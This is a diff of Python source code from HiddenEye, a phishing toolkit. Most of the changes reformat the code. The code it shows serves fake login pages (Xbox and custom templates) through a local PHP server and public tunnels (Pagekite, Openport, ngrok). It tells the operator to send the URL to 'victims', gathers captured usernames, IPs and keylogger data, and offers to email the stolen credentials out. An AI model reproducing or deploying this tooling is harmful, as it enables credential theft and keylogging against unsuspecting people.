@@ -137,20 +137,27 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
     elif page == 'Xbox':
         copy_tree('WebPages/xbox/', "Server/www/")
     elif page == 'CUSTOM(1)':
-        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)".format(MAIN0, MAIN4))
-        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]".format(MAIN0, MAIN4))
-        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(MAIN0, MAIN4))
-        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
+        print(
+            "\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)".format(MAIN0, MAIN4))
+        print(
+            "\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]".format(MAIN0, MAIN4))
+        input(
+            "\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(MAIN0, MAIN4))
+        print(
+            "\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
         sleep(3)
         copy_tree('WebPages/CUSTOM(1)/', "Server/www/")
     elif page == 'CUSTOM(2)':
-        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)".format(MAIN0, MAIN4))
-        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]".format(MAIN0, MAIN4))
-        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(MAIN0, MAIN4))
-        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
+        print(
+            "\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)".format(MAIN0, MAIN4))
+        print(
+            "\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]".format(MAIN0, MAIN4))
+        input(
+            "\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(MAIN0, MAIN4))
+        print(
+            "\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
         sleep(3)
         copy_tree('WebPages/CUSTOM(2)/', "Server/www/")
-    
 
     # Tools Below && Phishing Pages Above
     elif customOption == '1' and page == 'LOCATION':
@@ -176,7 +183,8 @@ def selectPort():  # Question where user must select port
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
+    print(
+        "\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
     choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
     try:
         if (int(choice) > 65535 or int(choice) < 1):
@@ -226,6 +234,7 @@ def selectServer(port):  # Question where user must select server
         system('clear')
         return selectServer(port)
 
+
 def runLocalhost(port):
     system('clear')
     print('''
@@ -234,10 +243,12 @@ def runLocalhost(port):
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(MAIN0, MAIN4))
+    print(
+        "\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(MAIN0, MAIN4))
     host = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
     system("fuser -k %s/tcp > /dev/null 2>&1".format(port))
-    system("cd Server/www/ && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
+    system(
+        "cd Server/www/ && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
     print('\n[*] Starting Server On Address:: {0}:{1}'.format(host, port))
     sleep(2)
     system('clear')
@@ -250,91 +261,111 @@ def runLocalhost(port):
     print("\n{0}[{1}!{0}]{1} SEND THIS URL TO THE VICTIMS ON SAME NETWORK-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://{4}:{3}\n".format(MAIN0, MAIN2, MAIN3, port, host))
     print("\n")
 
+
 def runPagekite(port):
-	system('clear')
-	print('''
+    system('clear')
+    print('''
 		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
 		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
 		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
 		{0}http://github.com/darksecdevelopers
 		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PAGEKITE SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-	if 256 == system('which python2 > /dev/null'):
-		print('[*] Python2 not Installed, Pagekite Only Supports Python2!!')
-		input('\n Press Enter To Try installing Python2 Now..')
-		system('apt install python2')
-		if 256 == system('which python2 > /dev/null'):
-			system('clear')
-			print("\n{0}[{1}*{0}] {1}FAILED TO INSTALL PYTHON2 (TRY MANUALLY)..{1}".format(MAIN0, MAIN4))
-			sleep(2)
-			selectServer(port)
-		else:
-			pass	
-	else:
-		try:
-			subdomain = input("\n{0}[{2}*{0}] {0}Enter A Custom Subdomain Ex.(yourname):\n{0}Custom Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
-			print("\n{0}[{1}*{0}] {1}Use Temporary Email Services(Don't Harm Anyone).{1}".format(MAIN0, MAIN4))
-			print("{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
-			print("{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
-			print("{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
-			print("{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}".format(MAIN0, MAIN4))
-			input("\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
-			system('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
-		except KeyboardInterrupt:
-			print('[!] Please Copy the Generated Link For Further Use')
-			getCredentials(port)
+    if 256 == system('which python2 > /dev/null'):
+        print('[*] Python2 not Installed, Pagekite Only Supports Python2!!')
+        input('\n Press Enter To Try installing Python2 Now..')
+        system('apt install python2')
+        if 256 == system('which python2 > /dev/null'):
+            system('clear')
+            print(
+                "\n{0}[{1}*{0}] {1}FAILED TO INSTALL PYTHON2 (TRY MANUALLY)..{1}".format(MAIN0, MAIN4))
+            sleep(2)
+            selectServer(port)
+        else:
+            pass
+    else:
+        try:
+            subdomain = input(
+                "\n{0}[{2}*{0}] {0}Enter A Custom Subdomain Ex.(yourname):\n{0}Custom Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
+            print(
+                "\n{0}[{1}*{0}] {1}Use Temporary Email Services(Don't Harm Anyone).{1}".format(MAIN0, MAIN4))
+            print(
+                "{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
+            print(
+                "{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
+            print(
+                "{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
+            print(
+                "{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}".format(MAIN0, MAIN4))
+            input(
+                "\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
+            system(
+                'python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
+        except KeyboardInterrupt:
+            print('[!] Please Copy the Generated Link For Further Use')
+            getCredentials(port)
 
-			
+
 def runOpenport(port):
-	system('clear')
-	print('''
+    system('clear')
+    print('''
 		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
 		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
 		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
 		{0}http://github.com/darksecdevelopers
 		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-	if 256 == system('which openport > /dev/null'):
-		system('clear')
-		print('[*] Openport not Installed correctly, Try installing it manually !!')
-		print('[*] Check Here ... https://openport.io/download')
-		input('\n Press Enter To Go back..')
-		selectServer(port)
-	else:
-		manageOpenporturl(port)
+    if 256 == system('which openport > /dev/null'):
+        system('clear')
+        print('[*] Openport not Installed correctly, Try installing it manually !!')
+        print('[*] Check Here ... https://openport.io/download')
+        input('\n Press Enter To Go back..')
+        selectServer(port)
+    else:
+        manageOpenporturl(port)
+
 
 def manageOpenporturl(port):
-	system('rm output.txt > /dev/null 2>&1')
-	system('openport -K && openport %s > output.txt &' % (port)) 
-	print('{0}[{1}*{0}] {1}Openport Server Running in Background.. Please wait.'.format(MAIN0, MAIN4))
-	sleep(20) # Sleep time is important as the openport command takes some time to give response link.
-	system('cat output.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | grep -v https://openport.io/user > openport.txt') # Taking out the neccesary verification link from output txt file of openport (above). 
-	print('{0}[{1}*{0}] {1}Working To Get OpenPort Tunnel Activation Link...'.format(MAIN0, MAIN4))
-	with open('openport.txt') as f:
-		read_data = f.read()
-		if 'openport.io/l/' in read_data:
-			print('{0}[{1}*{0}] {1}Got Activation Link...'.format(MAIN0, MAIN4))
-			pass
-		else:
-			print('{0}[{1}^{0}] {1}Failed To Get Openport Activation Link... '.format(MAIN0, MAIN4))
-			output = open('output.txt', 'r')
-			output = output.read()
-			print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(MAIN0, MAIN4, output))
-			input('\n\n{0}[{1}*{0}] {1}Try Other Tunnels... (Press Enter)'.format(MAIN0, MAIN4))
-			selectServer(port)
-		
-	urlFile = open('openport.txt', 'r')
-	urltoverify = urlFile.read().strip()
-	print('{0}[{1}*{0}] {1}Open This Activation Link From Browser to Get Tunnel Link...\n'.format(MAIN0, MAIN4))
-	print('{0}[{1}*{0}] {1}Tunnel Activation Link:{0}{2} '.format(MAIN0, MAIN4, urltoverify))
-	url = input('\n\n{0}[{1}*{0}] {1}Enter The Tunnel Link Found in Browser: {0} '.format(MAIN0, MAIN4,))
-	sleep(4)
-	system('clear')
-	print('''
+    system('rm output.txt > /dev/null 2>&1')
+    system('openport -K && openport %s > output.txt &' % (port))
+    print('{0}[{1}*{0}] {1}Openport Server Running in Background.. Please wait.'.format(MAIN0, MAIN4))
+    # Sleep time is important as the openport command takes some time to give response link.
+    sleep(20)
+    # Taking out the neccesary verification link from output txt file of openport (above).
+    system(
+        'cat output.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | grep -v https://openport.io/user > openport.txt')
+    print('{0}[{1}*{0}] {1}Working To Get OpenPort Tunnel Activation Link...'.format(MAIN0, MAIN4))
+    with open('openport.txt') as f:
+        read_data = f.read()
+        if 'openport.io/l/' in read_data:
+            print('{0}[{1}*{0}] {1}Got Activation Link...'.format(MAIN0, MAIN4))
+            pass
+        else:
+            print('{0}[{1}^{0}] {1}Failed To Get Openport Activation Link... '.format(
+                MAIN0, MAIN4))
+            output = open('output.txt', 'r')
+            output = output.read()
+            print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(
+                MAIN0, MAIN4, output))
+            input(
+                '\n\n{0}[{1}*{0}] {1}Try Other Tunnels... (Press Enter)'.format(MAIN0, MAIN4))
+            selectServer(port)
+
+    urlFile = open('openport.txt', 'r')
+    urltoverify = urlFile.read().strip()
+    print('{0}[{1}*{0}] {1}Open This Activation Link From Browser to Get Tunnel Link...\n'.format(MAIN0, MAIN4))
+    print(
+        '{0}[{1}*{0}] {1}Tunnel Activation Link:{0}{2} '.format(MAIN0, MAIN4, urltoverify))
+    url = input(
+        '\n\n{0}[{1}*{0}] {1}Enter The Tunnel Link Found in Browser: {0} '.format(MAIN0, MAIN4,))
+    sleep(4)
+    system('clear')
+    print('''
 	    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
 	    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
 	    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
 	    {0}http://github.com/darksecdevelopers
 	    {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-	print("\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n".format(MAIN0, MAIN4, MAIN3, port, url))
+    print("\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n".format(MAIN0, MAIN4, MAIN3, port, url))
+
 
 def runNgrok(port):
     system('killall -2 ngrok > /dev/null')
@@ -559,7 +590,6 @@ def runLT(port, npm):
         runLT(port, npm)
 
 
-
 def mainMenu():
     system('clear')
     with open('version.txt') as f:
@@ -768,8 +798,8 @@ ________________________________________________________________________________
         loadModule('CUSTOM(2)')
         customOption = ''
         runPhishing('CUSTOM(2)', customOption)
-    
-    #Below Are Tools And Above Are Phishing Modules..
+
+    # Below Are Tools And Above Are Phishing Modules..
 
     elif option == 'A' or option == 'a':
         loadModule('LOCATION')
@@ -804,8 +834,9 @@ def inputCustom():  # Question where user can input custom web-link
     else:
         custom = 'http://' + custom
 
-    if path.exists('Server/www/js/location.js'): # For Location (gdrive) Template Redirection. 
-        with open('Server/www/js/location.js') as f: 
+    # For Location (gdrive) Template Redirection.
+    if path.exists('Server/www/js/location.js'):
+        with open('Server/www/js/location.js') as f:
             read_data = f.read()
         c = read_data.replace('<CUSTOM>', custom)
         f = open('Server/www/js/location.js', 'w')
@@ -1000,7 +1031,8 @@ def addkeylogger():
         sleep(2)
 
 
-def emailPrompt3(port):  # Ask user to start sending credentials to recipient Email Address.
+# Ask user to start sending credentials to recipient Email Address.
+def emailPrompt3(port):
     choice = input(
         "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
     if choice == 'Y' or choice == 'y':
@@ -1020,6 +1052,7 @@ def emailPrompt3(port):  # Ask user to start sending credentials to recipient Em
         sleep(1)
         system('clear')
         return emailPrompt3(port)
+
 
 def endMessage(port):  # Message when HiddenEye exit
     choice = input(
@@ -1046,8 +1079,10 @@ def endMessage(port):  # Message when HiddenEye exit
         system('clear')
         return endMessage(port)
 
+
 def returnServer(port):
-	selectServer(port)
+    selectServer(port)
+
 
 def getCredentials(port):
     system("fuser -k Server/www/usernames.txt > /dev/null 2>&1")
@@ -1063,12 +1098,11 @@ def getCredentials(port):
              cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt &&
              rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt""")
 
+
 def startmonitor():
 
     system("tail -f Server/www/usernames.txt&")
     system("tail -f Server/www/ip.txt&")
-
-
 
 
 def writeLog(ctx):  # Writing log
